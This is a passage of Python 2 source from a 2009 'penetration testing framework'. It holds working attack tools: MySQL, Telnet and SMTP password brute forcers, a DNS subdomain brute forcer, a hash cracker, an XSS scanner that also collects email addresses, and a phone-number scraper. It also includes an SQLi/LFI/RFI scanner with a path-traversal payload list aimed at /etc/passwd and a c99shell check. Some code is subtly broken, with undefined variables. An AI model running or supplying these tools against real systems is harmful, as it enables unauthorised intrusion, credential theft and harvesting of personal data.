        					request_web = urllib2.Request(results_web)
        					request_web.add_header('User-Agent','Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)')
        					opener_web = urllib2.build_opener()                           
        					text = opener_web.open(request_web).read()
        					names = re.findall(('\d\d\d\-\d\d\d\-\d\d\d\d'),StripTags(text))
						print "[+] Found:",len(names)
        					for name in names:
							if name not in d:
								d.append(name)
        					page_counter +=10
        
				except IOError:
    					print "[-] Can't connect to MSN Web!"+""
					pass
				
			def getyahoo():
	
				page_counter=0
				try:
    					while page_counter < int(sakman):
        					results_web = 'http://search.yahoo.com/search?p='+str(query)+'&b='+repr(page_counter)
        					request_web = urllib2.Request(results_web)
        					request_web.add_header('User-Agent','Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)')
        					opener_web = urllib2.build_opener()                           
        					text = opener_web.open(request_web).read()
        					names = re.findall(('\d\d\d\-\d\d\d\-\d\d\d\d'),StripTags(text))
						print "[+] Found:",len(names)
        					for name in names:
							if name not in d:
								d.append(name)
        					page_counter +=10
        
				except IOError:
			    		print "[-] Can't connect to Yahoo Web!"+""
					pass
				
			def getalta():
	
				page_counter=0
				try:
			    		while page_counter < int(sakman):
        					results_web = 'http://www.altavista.com/web/results?q='+str(query)+'&stq=10'+repr(page_counter)
       				 		request_web = urllib2.Request(results_web)
        					request_web.add_header('User-Agent','Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)')
			        		opener_web = urllib2.build_opener()                           
			        		text = opener_web.open(request_web).read()
			        		names = re.findall(('\d\d\d\-\d\d\d\-\d\d\d\d'),StripTags(text))
						print "[+] Found:",len(names)
			        		for name in names:
							if name not in d:
								d.append(name)
			        		page_counter +=10
	        
				except IOError:
			    		print "[-] Can't connect to Altavista Web!"+""
					pass
		
			ashik=raw_input("\nEnter Qeary Here : ")
			sakman=input("\nEnter How Many Phone No You Want To Fatch : ")
			sohil=raw_input("\nEnter The File Name Where You Want To Save Risult : ")

			print "[+] Searching: Google.com"
			print "[+] Target:",ashik
			print "[+] Total:",sakman
			print "[+] File:",sohil

			langs = ["en", "it", "nl", "ru", "ua", "pl", "de", "be", "kr", "fr", "es", "se", "no", "ir", "za"]
			print "[+] Languages:",len(langs),"\n"
			query = re.sub("\s","+",ashik)	
			d=[]

			while len(d) < int(sakman):
				for lang in langs:
					print "[+] Language:",lang
					getgoog(lang)
					langs.remove(lang)
					d = list(sets.Set(d))
					print "[+] Found:",len(d)
				if len(langs) == 0:
					print "\n[+] Searching: MSN.com"
					getmsn()
					print "\n[+] Searching: Yahoo.com"
					getyahoo()
					print "\n[+] Searching: Altavista.com"
					getalta()
					break
		
			file = open(sohil, "a")
			print "\n[+] Found:",len(d)
			print "[+] Writing Data:",sohil
			for number in d:	
				file.writelines(number+"\n")
			file.close()
			print "[-] Done\n"


			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")


def mysql():
	import threading, time, random, sys
	from copy import copy
	cho= '1'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t##################################################"
		print "\t\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE   #" 
		print "\t\t#    Copyright (C) 2009 By Ashikali              #"
		print "\t\t#    MYSQL BRUTE FORCER                            #" 
		print "\t\t#    Ashikali1208[at]yahoo[dot]com               #"                                
		print "\t\t#    www.Ashikali.com                            #" 
		print "\t\t#    GNU General Public License                  #"
		print "\t\t##################################################"
		print "\n\t\tEnter 1 For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
		if cho == '2':
			hlpmysql()
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')

			ashik=raw_input("\nEnter Target Here : ")
			sakman=raw_input("\nEnter The Port Here : ")
			sujat=raw_input("\nEnter The Database Name Here : ")
			sohil=raw_input("\nEnter The User List Here File Here : ")
			shahid=raw_input("\nEnter The Word List Here : ")
			try:
				import MySQLdb
			except(ImportError):
				print "\nYou need the MySQLdb package found here: http://sourceforge.net/projects/mysql-python\n"
				sys.exit(1)
			try:
  				users = open(sohil, "r").readlines()
			except(IOError): 
  				print "Error: Check your userlist path\n"
  				sys.exit(1)
  
			try:
  				words = open(shahid, "r").readlines()
			except(IOError): 
  				print "Error: Check your wordlist path\n"
  				sys.exit(1)

			print "[+] Server:",ashik
			print "[+] Port:",sakman
			print "[+] Database:",sujat
			print "[+] Users Loaded:",len(users)
			print "[+] Words Loaded:",len(words),"\n"

			wordlist = copy(words)

			def reloader():
				for word in wordlist:
					words.append(word)

			def getword():
				lock = threading.Lock()
				lock.acquire()
				if len(words) != 0:
					value = random.sample(words,  1)
					words.remove(value[0])		
				else:
					print "\nReloading Wordlist - Changing User\n"
					reloader()
					value = random.sample(words,  1)
					users.remove(users[0])
		
				lock.release()
				if len(users) ==1:
					return value[0][:-1], users[0]
				else:
					return value[0][:-1], users[0][:-1]
		
			class Worker(threading.Thread):
	
				def run(self):
					value, user = getword()
					try:
						print "-"*12
						print "User:",user,"Password:",value
						db=MySQLdb.connect(host=ashik,user=user,passwd=value,db=sujat,port=int(sakman))
						print "\t\nLogin successful:",value, user
						db.close()
						work.join()
						sys.exit(2)
					except(MySQLdb.Error), msg: 
						#print "An error occurred:", msg
						pass
 
			for i in range(len(words)*len(users)):
				work = Worker()
				work.start()
				time.sleep(1)
			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")

def wordl():
	import sys, time
	cho= '1'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t##################################################"
		print "\t\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE   #" 
		print "\t\t#    Copyright (C) 2009 By Ashikali              #"
		print "\t\t#    WORDLIST DICTOINARY MAKER                   #" 
		print "\t\t#    Ashikali1208[at]yahoo[dot]com               #"                                
		print "\t\t#    www.Ashikali.com                            #" 
		print "\t\t#    GNU General Public License                  #"
		print "\t\t##################################################"
		print "\n\t\tEnter 1 For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
		if cho == '2':
			hlpwordl()
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			def write(w):
				time.sleep(0.2) #Edit according to your system.
				ofile.writelines(''.join(w)+"\n")
	
			def main(first, start, second=[]):
				if not start: return write(second)
    				for i in range(len(first)):
        				second.append(first.pop(i))
        				main(first, start-1, second)
        				first.insert(i, second.pop())

			mula=raw_input("\nEnter Character Set Here : ")
			pula=raw_input("\nEnter Word leanth Here : ")
			lama=raw_input("\nEnter Output File Here : ")
			print "\nCharSet:",mula
			print "Length:",pula
			print "Writing Output:",lama
			print "\nWorking..."
			ofile = open(lama, "a")
			main(list(mula), int(pula))
			ofile.close()
			print "\nDone\n"
			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")


def telb():
	
	import threading, time, random, sys, telnetlib
	from copy import copy
	cho= '1'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t#################################################"
		print "\t\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE  #" 
		print "\t\t#    Copyright (C) 2009 By Ashikali             #"
		print "\t\t#    TELNET BRUTE FORCER                        #" 
		print "\t\t#    Ashikali1208[at]yahoo[dot]com              #"                                
		print "\t\t#    www.Ashikali.com                           #" 
		print "\t\t#    GNU General Public License                 #"
		print "\t\t#################################################"
		print "\n\t\tEnter 1 For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
		if cho == '2':
			hlptel()
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')

			umm=raw_input("\nEnter The Target Here : ")
			sohil=raw_input("\nEnter The Userfile Here : ")
			sohel=raw_input("\nEnter The Word File Here : ")

			try:
  				users = open(sohil, "r").readlines()
			except(IOError): 
  				print "Error: Check your userlist path\n"
  				sys.exit(1)
  
			try:
  				words = open(sohel, "r").readlines()
			except(IOError): 
  				print "Error: Check your wordlist path\n"
  				sys.exit(1)

			print "[+] Server:",umm
			print "[+] Users Loaded:",len(users)
			print "[+] Words Loaded:",len(words),"\n"

			wordlist = copy(words)

			def reloader():
				for word in wordlist:
					words.append(word)

			def getword():
				lock = threading.Lock()
				lock.acquire()
				if len(words) != 0:
					value = random.sample(words,  1)
					words.remove(value[0])
		
				else:
					print "\nReloading Wordlist - Changing User\n"
					reloader()
					value = random.sample(words,  1)
					users.remove(users[0])
		
				lock.release()
				if len(users) ==1:
					return value[0][:-1], users[0]
				else:
					return value[0][:-1], users[0][:-1]
		
			class Worker(threading.Thread):
	
				def run(self):
					value, user = getword()
					try:
						print "-"*12
						print "User:",user,"Password:",value
						tn = telnetlib.Telnet(umm)
						tn.read_until("login: ")
						tn.write(user + "\n")
						if password:
							tn.read_until("Password: ")
							tn.write(value + "\n")
						tn.write("ls\n")
						tn.write("exit\n")
						print tn.read_all()
						print "\t\nLogin successful:",value, user
						tn.close()
						work.join()
						sys.exit(2)
					except: 
						pass
 
			for i in range(len(words)*len(users)):
				work = Worker()
				work.start()
				time.sleep(1)
			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")


def xssi():

	#!/usr/bin/python

	import sys, urllib2, re, sets, random, httplib, time, socket

	global xss_payloads,alert

	def StripTags(text):
	     finished = 0
	     while not finished:
	         finished = 1
	         start = text.find("<")
	         if start >= 0:
	             stop = text[start:].find(">")
	             if stop >= 0:
	                 text = text[:start] + text[start+stop+1:]
	                 finished = 0
	     return text
	
	def timer():
		now = time.localtime(time.time())
		return time.asctime(now)


	def getemails(site):

		try:
			if site.split("/",1)[0] not in done:
				print "\t[+] Collecting Emails:",site.split("/",1)[0]
				webpage = urllib2.urlopen(proto+"://"+site.split("/",1)[0], port).read()
				emails = re.findall('[\w\.\-]+@[\w\.\-]+\.\w\w\w', webpage)
				done.append(site.split("/",1)[0])
				if emails:
					return emails
		except(KeyboardInterrupt):
			print "\n[-] Cancelled -",timer(),"\n"
			sys.exit(1)
		except(IndexError):
			pass
		
	def getvar(site):
		
		names = []
		actions = []
		print "\n","-"*45
		print "[+] Searching:",site
		try:
			webpage = urllib2.urlopen(proto+"://"+site, port).read()
			emails = re.findall('[\w\.\-]+@[\w\.\-]+\.\w\w\w', webpage)
			var = re.findall("\?[\w\.\-/]*\=",webpage)
			if len(var) >=1:
				var = list(sets.Set(var))
			found_action = re.findall("action=\"[\w\.\-/]*\"", webpage.lower())
			found_action = list(sets.Set(found_action))
			if len(found_action) >= 1:
				for a in found_action:
					a = a.split('"',2)[1]
					try:
						if a[0] != "/":
							a = "/"+a
					except(IndexError):
							pass
					actions.append(a)
			found_names = re.findall("name=\"[\w\.\-/]*\"", webpage.lower())
			found_names = list(sets.Set(found_names))
			for n in found_names:
				names.append(n.split('"',2)[1])
			print "[+] Variables:",len(var),"| Actions:",len(actions),"| Fields:",len(names)
			print "[+] Avg Requests:",(len(var)+len(names)+(len(actions)*len(names))+(len(actions)*len(names)))*len(xss_payloads)
			if len(var) >= 1:
				for v in var:
					if site.count("/") >= 2:
						for x in xrange(site.count("/")):
							for xss in xss_payloads:
								tester(site.rsplit('/',x+1)[0]+"/"+v+xss)
					for xss in xss_payloads:
						tester(site+"/"+v+xss)
			
			if len(names) >= 1:
				for n in names:
					if site.count("/") >= 2:
						for x in xrange(site.count("/")):
							for xss in xss_payloads:
								tester(site.rsplit('/',x+1)[0]+"/"+"?"+n+"="+xss)
					for xss in xss_payloads:
						tester(site+"/"+"?"+n+"="+xss)
			
			if len(actions) != 0 and len(names) >= 1:
				for a in actions:
					for n in names:
						if site.count("/") >= 2:
							for x in xrange(site.count("/")):
								for xss in xss_payloads:
									tester(site.rsplit('/',x+1)[0]+a+"?"+n+"="+xss)
						#tester(site.split("/")[0]+a+"?"+n+"="+xss)
				
			if len(actions) != 0 and len(var) >= 1:
				for a in actions:
					for v in var:
						if site.count("/") >= 2:
							for x in xrange(site.count("/")):
								for xss in xss_payloads:
									tester(site.rsplit('/',x+1)[0]+a+v+xss)
						else:
							for xss in xss_payloads:
								tester(site.split("/")[0]+a+v+xss)	
			
		
		except(socket.timeout, IOError, ValueError, socket.error, socket.gaierror):
			
			pass
		except(KeyboardInterrupt):
			print "\n[-] Cancelled -",timer(),"\n"
			sys.exit(1)
				
	def tester(target):
	
		if verbose ==1:
			if message != "":
				print "Target:",target.replace(alert ,message)
			else:
				print "Target:",target
		
		try:
			source = urllib2.urlopen(proto+"://"+target, port).read()
			h = httplib.HTTPConnection(target.split('/')[0], int(port))
			try:
				h.request("GET", "/"+target.split('/',1)[1])
			except(IndexError):
				h.request("GET", "/")
			r1 = h.getresponse()
			if verbose ==1:
				print "\t[+] Response:",r1.status, r1.reason
			if re.search(alert.replace("%2D","-"), source) != None and r1.status not in range(303, 418):
				if target not in found_xss:
					if message != "":
						print "\n[!] XSS FOUND:", target.replace(alert ,message)
					else:
						print "\n[!] XSS FOUND AT:", target
					print "\t[+] Response:",r1.status, r1.reason
					emails = getemails(target)
					if emails:
						print "\t[+] Email:",len(emails),"addresses\n"
						found_xss.setdefault(target, list(sets.Set(emails)))
					else:
						found_xss[target] = "None"
		except(socket.timeout, socket.gaierror, socket.error, IOError, ValueError, httplib.BadStatusLine, httplib.IncompleteRead, httplib.InvalidURL):
			pass
		except(KeyboardInterrupt):
			print "\n[-] Cancelled -",timer(),"\n"
			sys.exit(1)
		except():
			pass
					
	
 
	site = raw_input("\nEnter The Website Here : ")
	port = raw_input("\nEnter The Port Here : ")
	verbose = 1
	txt ='xssscanningreport.txt' 
	al='XSS FOUND'
	message = re.sub("\s","%2D",al)
	socket.setdefaulttimeout(10)
	found_xss = {}
	done = []
	count = 0
	proto = "http"
	alert = "ashikali%2D1208%2DY0U"
	print "\n[+] XSS_scan Loaded"
	print "[+] Verbose Mode On"
	print "[+] Alert:",message
	print "[+] File:",txt
	print "[+] XSS Payloads:",len(xss_payloads)
	print "[+] Site:",site
	print "[+] Port:",port
	if site[:7] == "http://":
		site = site.replace("http://","")
	if site[:8] == "https://":
		proto = "https"
		if port == "80":
			print "[!] Using port 80 with https? (443)"
		site = site.replace("https://","")
	print "[+] Started:",timer()
	print "\n[-] Cancel: Press Ctrl-C"
	time.sleep(4)
	getvar(site)
	
	print "-"*65
	print "\n\n[+] Potential XSS found:",len(found_xss),"\n"
	time.sleep(3)
	if txt != None and len(found_xss) >=1:
		xss_file = open(txt, "a")
		xss_file.writelines("\n\t\t#################################################\n")
		xss_file.writelines("\t\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE  #\n") 
		xss_file.writelines("\t\t#    Copyright (C) 2009 By Ashikali             #\n")
		xss_file.writelines("\t\t#    xss scanning report                        #\n")
		xss_file.writelines("\t\t#    Ashikali1208[at]yahoo[dot]com              #\n")                                
		xss_file.writelines("\t\t#    www.Ashikali.com                           #\n") 
		xss_file.writelines("\t\t#    GNU General Public License                 #\n")
		xss_file.writelines("\t\t#################################################\n")
		xss_file.writelines("\t\t            ALL LINKS ARE VULNARABLE BY XSS \n")
		xss_file.writelines("\t\t----------------------------------------------------\n\n")
		print "[+] Writing Data:",txt
	else:
		print "[-] No data written to disk"
	for k in found_xss.keys():
		count+=1
		if txt != None:
			if message != "":
				xss_file.writelines("["+str(count)+"] "+k.replace(alert ,message)+"\n")
			else:
				xss_file.writelines("["+str(count)+"] "+k+"\n")
		if message != "":
			print "\n["+str(count)+"]",k.replace(alert ,message)
		else:
			print "\n["+str(count)+"]",k
		addrs = found_xss[k]
		if addrs != "None":
			print "\t[+] Email addresses:" 
			for addr in addrs: 
				if txt != None:
					xss_file.writelines("\tEmail: "+addr+"\n")
				print "\t   -",addr
	print "\n[-] Done -",timer(),"\n"
	sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	

	
	
def mdb():
	
	import sys
	cho = '1'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t#################################################"
		print "\t\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE  #" 
		print "\t\t#    Copyright (C) 2009 By Ashikali             #"
		print "\t\t#    MYSQL 5 BRUTE FORCER                       #" 
		print "\t\t#    Ashikali1208[at]yahoo[dot]com              #"                                
		print "\t\t#    www.Ashikali.com                           #" 
		print "\t\t#    GNU General Public License                 #"
		print "\t\t#################################################"
		print "\n\t\tEnter 1 For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
		if cho == '2':
			hlpmdba()
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			def c1(word):
				s = hashlib.sha1()
				s.update(word[:-1])
				s2 = hashlib.sha1()
				s2.update(s.digest())
				return s2.hexdigest()

			def c2(word):
				s = sha.new()
				s.update(word[:-1])
				s2 = sha.new()
				s2.update(s.digest())
				return s2.hexdigest()
	
			pw = raw_input("\nEnter The MD5 Hash Here :")
			wdw= raw_input("\nEnter The Word List File Here : ")
			if len(pw) != 40:
				print "Improper hash length\n"
  				sys.exit(1)
			try:
  				words = open(wdw, "r")
			except(IOError): 
  				print "Error: Check your wordlist path\n"
  				sys.exit(1)
			words = words.readlines()
			print "\nWords Loaded:",len(words)

			try:
				import hashlib
				for word in words:
					if pw == c1(word): 
						print "\nPassword is:",word
			except(ImportError):
				import sha
				for word in words:
					if pw == c2(word): 
						print "\nPassword is:",word
			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")





def dnsf():

	import threading, time, random, sys, socket
	from copy import copy
	cho = '1'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t#################################################"
		print "\t\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE  #" 
		print "\t\t#    Copyright (C) 2009 By Ashikali             #"
		print "\t\t#    DOMAIN BRUTE FORCER                        #" 
		print "\t\t#    Ashikali1208[at]yahoo[dot]com              #"                                
		print "\t\t#    www.Ashikali.com                           #" 
		print "\t\t#    GNU General Public License                 #"
		print "\t\t#################################################"
		print "\n\t\tEnter 1 For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
		if cho == '2':		
			hlpdns()
		if cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			jum = raw_input("\nEnter the Target Here : ")
			salu = raw_input("\nEnter The Wordlist File Name Here : ")
			try:
  				words = open(salu, "r").readlines()
			except(IOError): 
  				print "Error: Check your wordlist path\n"
  				sys.exit(1)

			print "[+] Server:",jum
			print "[+] Words Loaded:",len(words),"\n"

			wordlist = copy(words)

			def reloader():
				for word in wordlist:
					words.append(word)

			def getword():
				lock = threading.Lock()
				lock.acquire()
				if len(words) != 0:
					value = random.sample(words,  1)
					words.remove(value[0])
		
				else:
					print "Reloading Wordlist\n"
					reloader()
					value = random.sample(words,  1)
		
				lock.release()
				return value[0]
		
			class Worker(threading.Thread):
	
				def run(self):
					value = getword()
					try:
						print "-"*12
						digger = value[:-1]+"."+jum
						print "Trying:", digger
						result = socket.getaddrinfo(digger, None, 0, socket.SOCK_STREAM)
						print "\n\t\tWorked:",[x[4][0] for x in result][0]," Hostname:",digger
					except(socket.gaierror), msg: 
						pass
 
			for i in range(len(words)):
				work = Worker()
				work.start()
				time.sleep(1)

			sending_back_to_Vilage=raw_input("\n\t")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")


def smt():

	#!/usr/bin/python
	import threading, time, random, sys, smtplib, socket	
	from smtplib import SMTP
	from copy import copy
	cho = '1'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t#################################################"
		print "\t\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE  #" 
		print "\t\t#    Copyright (C) 2009 By Ashikali             #"
		print "\t\t#    SMTP BRUTE FORCER                          #" 
		print "\t\t#    Ashikali1208[at]yahoo[dot]com              #"                                
		print "\t\t#    www.Ashikali.com                           #" 
		print "\t\t#    GNU General Public License                 #"
		print "\t\t#################################################"
		print "\n\t\tEnter 1 For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
		if cho == '2':
			hlpsmtp()	
		if cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')

			ashikali = raw_input("\nEnter The Target Here : ")
			salmanali = raw_input("\nEnter The User File Here : ")
			jigarali = raw_input("\nEnter The Word File Here : ")
		
			try:	
				helo = smtplib.SMTP(ashikali)
				name = helo.helo()
				helo.quit()
			except(socket.gaierror, socket.error, socket.herror, smtplib.SMTPException):
				name = "Server doesn't support the Helo cmd"

			try:
			  	users = open(salmanali, "r").readlines()
			except(IOError): 
	  			print "Error: Check your userlist path\n"
	  			sys.exit(1)
  
			try:
	  			words = open(jigarali, "r").readlines()
			except(IOError): 
	  			print "Error: Check your wordlist path\n"
	  			sys.exit(1)
	
			print "[+] Server:",ashikali
			print "[+] Users Loaded:",len(users)
			print "[+] Words Loaded:",len(words)
			print "[+] Report message:",name,"\n"
		
			wordlist = copy(words)
	
			def reloader():
				for word in wordlist:
					words.append(word)

			def getword():
				lock = threading.Lock()
				lock.acquire()
				if len(words) != 0:
					value = random.sample(words,  1)
					words.remove(value[0])
			
				else:
					print "\nReloading Wordlist - Changing User\n"
					reloader()
					value = random.sample(words,  1)
					users.remove(users[0])
			
				lock.release()
				return value[0][:-1], users[0][:-1]
		
			class Worker(threading.Thread):
		
				def run(self):
					value, user = getword()
					try:
						print "-"*12
						print "User:",user,"Password:",value
						smtp = smtplib.SMTP(ashikali)
						smtp.login(user, value)
						print "\t\nLogin successful:",user, value
						smtp.quit()
						work.join()
						sys.exit(2)
					except(socket.gaierror, socket.error, socket.herror, smtplib.SMTPException), msg: 
						#print "An error occurred:", msg
						pass
 
			for i in range(len(words)*len(users)):
				work = Worker()
				work.start()
				time.sleep(1)

			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	
		
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")




def anonymise():
	import sys, httplib, socket
		
	global an, pls, anony
	an=raw_input("\n\n\n\n\tEnter The Proxy Address Here : ")
	pls=raw_input("\n\tEnter The Port Here : ")
	anony = str(an) + ':' +str(pls)
	try:
		if an:
			print "\n\t[+] Testing Proxy..."
			h2 = httplib.HTTPConnection(anony)
			h2.connect()
			print "\n\t\t[-] Proxy:",anony,"Sucsessfully Loded"
	except(socket.timeout):
		print "\n\t\t[-] Proxy Timed Out"
		anony = 0
		pass
	except:
		print "\n\t\t[-] Proxy Failed"
		anony = 0
		pass
	abcr =raw_input("\n\n\t Process Done Please Press Any key To Go Back In Previous Menu...")

def sqlin():
	#!/usr/bin/python


	import urllib,sys,os,sgmllib 
	global jense
	rfi=""
	mode= ''
	myroot="root:x:"
	anjing="c99shell"
	cekrfi=''
	lfis = ["/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../etc/passwd%00","../../../../../../../../../../../../../etc/passwd%00","/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../etc/passwd","../../../../../../../../../../../../../etc/passwd"]
	pathdisclosure1="/home/"
	pathdisclosure2="/var/"
	pathdisclosure3="/www/"
	pathdisclosure4="/html/"
	pathdisclosure5="/usr/"
	pathdisclosure6="/user/"
	pathdisclosure7="/sites/"
	pathdisclosure8="/mnt"
	pathdisclosure9="/etc/"
	pathdisclosure10="/web/"
	penghubung=" in "
	gajebo="failed to open"
	l2="http://www.googlebig.com/"
	cachesqli="-"
	cacheblind1="-"
	cacheblind100="-"
	log = "webscan.txt"
	tanya="?"
	samadengan="="
	appname = os.path.basename(sys.argv[0]) 
	ceksqli="'"
	slash="/"
	cekblind1="+order+by+1--"
	cekblind100="+order+by+300--"
	mysqli1="You have an error in your SQL"
	mysqli2="Division by zero in"
	mysqli3="supplied argument is not a valid MySQL result resource in"
	mysqli4="Call to a member function"
	accesqli1="Microsoft JET Database"
	accesqli2="ODBC Microsoft Access Driver"
	mssqli1="Microsoft OLE DB Provider for SQL Server"
	mssqli2="Unclosed quotation mark"
	oracle="Microsoft OLE DB Provider for Oracle"
	mscfm="[Macromedia][SQLServer JDBC Driver][SQLServer]Incorrect"
	general="Incorrect syntax near"
	mywisdom="http://"
	sat_ahyar="=1"
	sat_ahyar=str(sat_ahyar)
	class MyParser(sgmllib.SGMLParser): 
	    "A simple parser class." 
 
 	    def parse(self, s): 
 	       	"Parse the given string 's'." 
 	       	self.feed(s) 
 	       	self.close() 
 
	    def __init__(self, verbose=0): 
	        "Initialise an object, passing 'verbose' to the superclass." 
	 
	        sgmllib.SGMLParser.__init__(self, verbose) 
	        self.hyperlinks = [] 
 
	    def start_a(self, attributes): 
	        "Process a hyperlink and its 'attributes'." 
	 
	        for name, value in attributes: 
	            if name == "href": 
	                self.hyperlinks.append(value) 
	            if name == "src": 
	                self.hyperlinks.append(value) 
 
	    def get_hyperlinks(self): 
	        "Return the list of hyperlinks." 
 
	        return self.hyperlinks 
 
	cho='1'
	while (cho != '3'):
		if jense == '2':
			bansql()	
		elif jense == '3':
			banbli()	
		elif jense == '4':
			banlfi()	
		elif jense == '5':
			banrfi()	
		print "\n\t\tEnter 1 For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
		if cho == '2':
				
			if jense == '2':
				hlpsqli()	
			elif jense == '3':
				hlpblind()	
			elif jense == '4':
				hlplfi()	
			elif jense == '5':
				hlprfi()
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			zero= raw_input("\n\tEnter Your Site Name Here : ") 
			site = zero.replace("http://","") 
			site = "http://" + site.lower() 
			if jense == '2':
				mode = "-sqli"
			elif jense == '3':
				mode = "-blind"
			elif jense == '4':
				mode = "-lfi"
			elif jense == '5':
				cekrfi= raw_input("\n\tEnter The Shell Path : ")
				print "\n\n"
				mode = "-rfi"
			else:
				exit
			try: 
			    site_data = urllib.urlopen(site) 
			    parser = MyParser() 
			    parser.parse(site_data.read()) 
			except(IOError),msg: 
			    print "Error in connecting site ", site 
			    print msg 
			    sys.exit(1) 
			links = parser.get_hyperlinks() 
			print "If Web Identify Sucsessfully Its Will logged at webscan.txt you May check the log after scanning finished"
			print "Woot Woot Massage will Idntify That Web Is Vulnarable"
			l2=site	
			urlbuta=site+slash
			url_rfi_basic=site+slash
			url_lfi_basic=site+slash
			z=0
			data=""
			x=0
